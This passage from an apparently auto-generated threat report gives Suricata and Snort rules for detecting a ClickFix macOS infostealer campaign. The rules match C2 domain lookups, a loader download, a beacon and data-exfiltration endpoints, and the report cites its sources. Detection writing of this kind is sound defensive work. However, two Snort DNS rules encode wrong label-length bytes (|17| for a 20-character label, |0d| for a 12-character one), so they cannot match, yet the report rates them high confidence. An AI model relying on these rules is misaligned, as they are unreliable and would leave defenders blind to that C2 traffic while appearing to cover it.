alert dns $HOME_NET any -> any any (msg:"ACTIONER ClickFix macOS C2 - 0x666.info DNS Lookup"; dns.query; content:"0x666.info"; nocase; sid:2200004; rev:1; metadata: author Actioner, created_at 2026_06_24, deployment Perimeter; reference:url,www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/; classtype:trojan-activity;)

alert dns $HOME_NET any -> any any (msg:"ACTIONER ClickFix macOS C2 - honestly.ink DNS Lookup"; dns.query; content:"honestly.ink"; nocase; sid:2200005; rev:1; metadata: author Actioner, created_at 2026_06_24, deployment Perimeter; reference:url,www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/; classtype:trojan-activity;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ACTIONER ClickFix macOS - AMOS/SHub Stealer Exfiltration to /gate Endpoint"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/gate"; endswith; sid:2200006; rev:1; metadata: author Actioner, created_at 2026_06_24, deployment Perimeter; reference:url,securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/; classtype:trojan-activity;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ACTIONER ClickFix macOS - AMOS/SHub Stealer Heartbeat Beacon"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/api/bot/heartbeat"; sid:2200007; rev:1; metadata: author Actioner, created_at 2026_06_24, deployment Perimeter; reference:url,securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/; classtype:trojan-activity;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ACTIONER ClickFix macOS - Loader Script Download Pattern"; flow:established,to_server; http.method; content:"GET"; http.uri; content:"/loader.sh?build="; sid:2200008; rev:1; metadata: author Actioner, created_at 2026_06_24, deployment Perimeter; reference:url,securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/; classtype:trojan-activity;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ACTIONER ClickFix macOS - Exfiltration to /contact Endpoint"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/contact"; endswith; sid:2200009; rev:1; metadata: author Actioner, created_at 2026_06_24, deployment Perimeter; reference:url,www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/; classtype:trojan-activity;)

alert dns $HOME_NET any -> any any (msg:"ACTIONER ClickFix macOS C2 - pla7ina.cfd DNS Lookup"; dns.query; content:"pla7ina.cfd"; nocase; sid:2200010; rev:1; metadata: author Actioner, created_at 2026_06_24, deployment Perimeter; reference:url,www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/; classtype:trojan-activity;)
```

<!-- AUDIT: Suricata rules validated via suricata -T -S clickfix_dmg_c2.rules -l /tmp/actioner. Output: "Configuration provided was successfully loaded. Exiting." All 10 rules passed syntax validation. DNS rules use dns.query sticky buffer; HTTP rules use http.method and http.uri sticky buffers with flow:established,to_server. -->

### Snort Rules: C2 Communication Detection

Six Snort rules targeting DNS queries for known C2 domains and HTTP-based C2 endpoints.

compile: structural check only -- ⚠️ uncompiled | confidence: DNS rules high (specific IOCs), HTTP rules medium (URI pattern matching)

```
alert udp $HOME_NET any -> any 53 (msg:"ACTIONER ClickFix macOS C2 - svs-verificationdate.beer DNS Query"; content:"|17|svs-verificationdate|04|beer|00|"; nocase; sid:2100001; rev:1; classtype:trojan-activity; reference:url,www.bleepingcomputer.com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/;)

alert udp $HOME_NET any -> any 53 (msg:"ACTIONER ClickFix macOS C2 - imper-strlk5.com DNS Query"; content:"|0c|imper-strlk5|03|com|00|"; nocase; sid:2100002; rev:1; classtype:trojan-activity; reference:url,securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/;)

alert udp $HOME_NET any -> any 53 (msg:"ACTIONER ClickFix macOS C2 - cleanmymacos.org DNS Query"; content:"|0d|cleanmymacos|03|org|00|"; nocase; sid:2100003; rev:1; classtype:trojan-activity; reference:url,www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"ACTIONER ClickFix macOS - AMOS Heartbeat Beacon POST /api/bot/heartbeat"; flow:established,to_server; content:"POST"; http_method; content:"/api/bot/heartbeat"; http_uri; sid:2100004; rev:1; classtype:trojan-activity; reference:url,securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"ACTIONER ClickFix macOS - Loader Script Request /loader.sh?build="; flow:established,to_server; content:"GET"; http_method; content:"/loader.sh?build="; http_uri; sid:2100005; rev:1; classtype:trojan-activity; reference:url,securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"ACTIONER ClickFix macOS - AMOS Data Exfiltration POST /gate"; flow:established,to_server; content:"POST"; http_method; content:"/gate"; http_uri; sid:2100006; rev:1; classtype:trojan-activity; reference:url,securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/;)
```

<!-- AUDIT: Snort rules structural check only -- no Snort compiler available in this environment. DNS rules use DNS wire format with length-prefixed labels. HTTP rules use http_method and http_uri content modifiers with established flow. SID range 2100000+. -->

## Sources

- BleepingComputer: [New macOS ClickFix attack silently mounts DMGs to push infostealer](https://www.bleepingcomputer.com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/) (June 23, 2026)
- Microsoft Security Blog: [ClickFix campaign uses fake macOS utilities lures to deliver infostealers](https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/) (May 6, 2026)
- Datadog Security Labs: [Tech impersonators: ClickFix and macOS infostealers](https://securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/) (2026)
- Sophos: [Evil evolution: ClickFix and macOS infostealers](https://www.sophos.com/en-us/blog/evil-evolution-clickfix-and-macos-infostealers) (2026)
- Jamf Threat Labs: [ClickFix Malware Uses macOS Script Editor to Deliver Atomic Stealer](https://www.jamf.com/blog/clickfix-macos-script-editor-atomic-stealer/) (2026)
- ANY.RUN: [ClickFix Hits macOS via AI Tools: Real Attack Analyzed](https://any.run/cybersecurity-blog/macos-clickfix-amos-attack/) (2026)

---

*Report generated by Actioner*
